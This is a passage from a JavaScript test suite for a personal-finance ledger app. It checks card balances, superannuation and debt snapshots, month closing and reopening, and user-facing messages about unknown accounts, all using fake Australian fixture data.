  const obs = { obs_id: "obs-statement-one", source_id: "src-statement-one", locator: "page 1", kind: "statement", occurred_on: p.period_end, amount_cents: p.closing_cents, currency: "AUD", subject_ref: account_ref, payload: { account_ref, ...p }, importer: "test", confidence: "1", status: "active" };
  await s.tables.appendNew("observation", [obs]);
  await s.tables.appendNew("source", [{ source_id: obs.source_id, sha256: "f".repeat(64), name: "Statement.pdf", origin: "manual", mime: "application/pdf", bytes: 1, stream_id: null, captured_at: `${today}T00:00:00Z`, status: "active", uri: "not-held:Statement.pdf" }]);
}
test("a card's balance: charges older than its first statement are inside that statement's opening, not on top of it", async () => {
  const s = await renter(stores.fake, "2027-02-14");
  await K.add(s, [cardFile([["2026-12-03", "SOME SHOP", 6000], ["2026-12-20", "SOME SHOP", 2500]])], { today: "2027-02-14" });
  await statement(s, "-77123", { period_start: "2026-12-15", period_end: "2027-01-14", opening_cents: -10000, closing_cents: -12500, credits_cents: 0, debits_cents: 2500 }, "2027-02-14");
  const { L, view } = await K.rebuildAt(s, { today: "2027-02-14" }), id = view.setup.account[0].account_id;
  assert.equal(L.balances.at(id, "2027-01"), -12500, "what the statement closed on");
  assert.equal(L.checks.find((c) => c.law === "L3" && c.scope === id).status, "pass");
});
const SUPER_HEAD = "Effective Date,Category,Narrative,Amount (AUD),Running Balance,Reference\n";
const superFile = () => ({ name: "Fund.csv", bytes: enc(`${SUPER_HEAD}2026-07-01,FEE-ADMIN,Administration fee,-10.00,44990.00,X1\n2026-07-31,EARNINGS,Investment earnings,250.00,45240.00,X2\n`) });
test("a file that needs only an account name has not failed anything: it is one question, and the answer brings it in", async () => {
  const s = await renter(stores.fake);
  const r = await K.add(s, [superFile()], { today: TODAY });
  assert.equal(r.needs_account.length, 1);
  const step = await K.next(s, { today: TODAY });
  assert.equal(step.say, "Which account is Fund.csv for?");
  assert.doesNotMatch(step.why, /failed|checks|again/);
  const f = (await K.status(s, { today: TODAY })).readiness;
  assert.equal(f.sources.refused, 0);
  assert.equal(f.sources.unread, 1);
  const again = await K.add(s, [superFile()], { today: TODAY, account: "Super", name: "Super" });
  assert.equal(again.added.length, 1);
  assert.notEqual((await K.next(s, { today: TODAY })).id, "no_account");
});
test("a file that yields a balance and no lines says what it read, and never says nothing became a line", async () => {
  const s = await renter(stores.fake);
  const r = await K.add(s, [superFile()], { today: TODAY, account: "Super", name: "Super" }), built = await K.rebuildAt(s, { today: TODAY });
  const w = K.fileWords(built, r.added[0].source_id);
  assert.equal(w.say, "Your super: $45,240.00 at 31 July 2026.");
  assert.equal(w.stated, true);
});
test("a card file makes a card: Not asked yet stops asking, and a statement corrects an account first read as a bank's", async () => {
  const s = await renter(stores.fake, "2027-02-14");
  const r = await K.add(s, [cardFile([["2026-12-03", "SOME SHOP", 6000]])], { today: "2027-02-14" });
  assert.equal(r.accounts_created[0].type, "credit_card");
  const f = (await K.status(s, { today: "2027-02-14" })).readiness;
  assert.ok(!f.scope.not_asked.includes("credit_card"));
  assert.doesNotMatch(f.unknown.join(" "), /a credit card/);
});
test("a debt or balance with no file: typed in, dated, shown as stated, in net worth and out of cash", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile(JULY)], { today: TODAY });
  const made = await K.decide(s, { stated: { kind: "help_debt", cents: 3114062, as_at: "2026-07-31" } }, { today: TODAY });
  await K.decide(s, { stated: { kind: "car_loan", cents: 1250000, as_at: "2026-07-31" } }, { today: TODAY });
  await K.decide(s, { stated: { kind: "super", cents: 8000000, as_at: "2026-07-31" } }, { today: TODAY });
  const { L, view } = await K.rebuildAt(s, { today: TODAY }), f = (await K.status(s, { today: TODAY })).readiness;
  const help = view.setup.account.find((a) => a.account_id === made.account_id);
  assert.equal(help.fidelity, "snapshot");
  assert.equal(help.class, "liability");
  assert.equal(L.balances.at(help.account_id, "2026-08"), -3114062);
  assert.equal(f.held.cash_cents, 265000, "the headline is cash");
  assert.equal(f.held.cash_accounts, 1);
  assert.equal(f.held.net_cents, 265000 - 3114062 - 1250000 + 8000000, "and the rest is net worth");
  assert.deepEqual(f.held.others, ["HELP debt", "Car loan", "Super"]);
  assert.deepEqual(f.stated.map((x) => [x.name, x.cents, x.as_at]), [["HELP debt", 3114062, "2026-07-31"], ["Car loan", 1250000, "2026-07-31"], ["Super", 8000000, "2026-07-31"]]);
  assert.ok(!f.scope.not_asked.includes("help_debt"));
  assert.ok(!f.scope.not_asked.includes("super"));
  assert.ok(f.scope.not_asked.includes("home_loan"), "a car loan says nothing about a home loan");
  await K.decide(s, { stated: { account_id: help.account_id, cents: 3000000, as_at: "2026-08-02" } }, { today: TODAY });
  assert.equal((await K.rebuildAt(s, { today: TODAY })).L.balances.at(help.account_id, "2026-08"), -3000000, "a newer figure replaces it");
  assert.equal((await K.status(s, { today: TODAY })).readiness.stated.find((x) => x.account_id === help.account_id).cents, 3000000);
});
test("a month says what stops it closing, the same words close gives, and it can be reopened with a reason", async () => {
  const today = "2026-09-05", s = await renter(stores.fake, today);
  await K.add(s, [bankFile([...JULY, ["2026-09-02", "WOOLWORTHS 1234 CARLTON", -700]])], { today });
  const months = (await K.status(s, { today })).readiness.months, july2 = months.find((m) => m.month === "2026-07"), sept = months.find((m) => m.month === "2026-09");
  assert.equal(july2.state, "ready");
  assert.equal(july2.why, null);
  assert.deepEqual(july2.left, ["lines still need an answer", "a pay is waiting on its payslip"]);
  assert.equal(sept.state, "open");
  assert.equal(sept.why, "September 2026 is not over yet.");
  assert.equal((await K.close(s, "2026-09", { today })).say, sept.why);
  assert.equal((await K.close(s, "2026-07", { today })).status, "closed");
  await assert.rejects(K.decide(s, { reopen: "2026-07" }, { today }), /needs a reason/);
  await K.decide(s, { reopen: "2026-07", reason: "A line was wrong." }, { today });
  assert.equal((await K.status(s, { today })).readiness.months.find((m) => m.month === "2026-07").state, "ready");
});
test("every failed check has a name a person can read, and money to an account we haven't met says which and how much", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile([...JULY, ["2026-07-10", "TFR TO SAVER", -40000], ["2026-07-24", "TFR TO SAVER", -60000]].sort((a, b) => (a[0] < b[0] ? -1 : 1)))], { today: TODAY });
  const f = (await K.status(s, { today: TODAY })).readiness, step = await K.next(s, { today: TODAY });
  assert.deepEqual(f.unmet, [{ words: "TFR TO SAVER", cents: 100000, lines: 2 }]);
  assert.equal(f.laws.failing[0].say, "$1,000.00 went to accounts we haven't met yet.");
  assert.equal(step.say, "Some of your money went to an account we haven't met yet.");
  assert.match(step.why, /^\$1,000\.00 went out as TFR TO SAVER\. /);
});
test("a payslip that names an account we can't place is asked about, and the answer holds", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile(JULY)], { today: TODAY });
  await s.tables.appendNew("observation", [{ obs_id: "obs-slip", source_id: "src-slip", locator: "page 1", kind: "payslip", occurred_on: "2026-07-01", amount_cents: 300000, currency: "AUD", subject_ref: "Sam", payload: { account_ref: "1111", person_ref: "Sam", employer_ref: "Acme", pay_date: "2026-07-01", period_start: "2026-06-18", period_end: "2026-07-01", gross_cents: 400000, tax_cents: 100000, net_cents: 300000, super_cents: 40000 }, importer: "test", confidence: "1", status: "active" }]);
  await s.tables.appendNew("source", [{ source_id: "src-slip", sha256: "e".repeat(64), name: "Slip.pdf", origin: "manual", mime: "application/pdf", bytes: 1, captured_at: `${TODAY}T00:00:00Z`, status: "active", uri: "not-held:Slip.pdf" }]);
  const f = (await K.status(s, { today: TODAY })).readiness;
  assert.deepEqual(f.unattached, [{ ref: "1111", from: "Slip.pdf" }]);
  await K.decide(s, { attach: { ref: "1111", account_id: "ACC-6789" } }, { today: TODAY });
  assert.deepEqual((await K.status(s, { today: TODAY })).readiness.unattached, []);
});
test("once every account is met, the headline stops talking about strangers", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile(JULY)], { today: TODAY });
  const built = await K.rebuildAt(s, { today: TODAY });
  built.L.checks.push({ law: "L2", scope: "clearing:transfer", status: "fail", gap_cents: -92999, detail: "Open 35 days." });   // a payment from before a card's first file: one side, and no stranger
  assert.equal(K.readiness(built).unmet.length, 0);
  const step = K.pick(built);
  assert.equal(step.say, "$929.99 moved, and we can only see one side of it.");
  assert.doesNotMatch(`${step.say} ${step.why}`, /haven't met/);
});
